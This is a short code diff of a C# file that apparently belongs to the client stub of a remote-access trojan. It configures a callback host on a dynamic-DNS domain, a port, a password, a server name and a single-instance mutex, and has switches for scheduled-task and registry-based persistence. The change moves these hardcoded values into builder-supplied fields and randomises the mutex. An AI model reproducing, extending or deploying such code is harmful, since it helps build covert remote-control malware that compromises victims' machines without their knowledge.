@@ -1,4 +1,5 @@
-﻿using bc.srv.Classes.Crypt;
+﻿using System;
+using bc.srv.Classes.Crypt;
 
 namespace bc.srv.Classes
 {
@@ -10,12 +11,10 @@ namespace bc.srv.Classes
             
             // NORMAL
             SrvData.Instance.Port = 2401;
-            SrvData.Instance.Password = "slevin";
-            SrvData.Instance.Host = "lqphnd2gfz.duckdns.org";
-            SrvData.Instance.ServerName = "imback";
-            SrvData.Instance.sMutex = "tUOns2DB6";
-
-
+            SrvData.Instance.Password = StringData.ServerInfo.Password;
+            SrvData.Instance.Host = StringData.ServerInfo.Host;
+            SrvData.Instance.ServerName = StringData.ServerInfo.Name;
+            SrvData.Instance.sMutex = Guid.NewGuid().ToString("N");
 
             SrvData.Instance.UseTaskScheduler = true;
             SrvData.Instance.BUseHkcu = false;
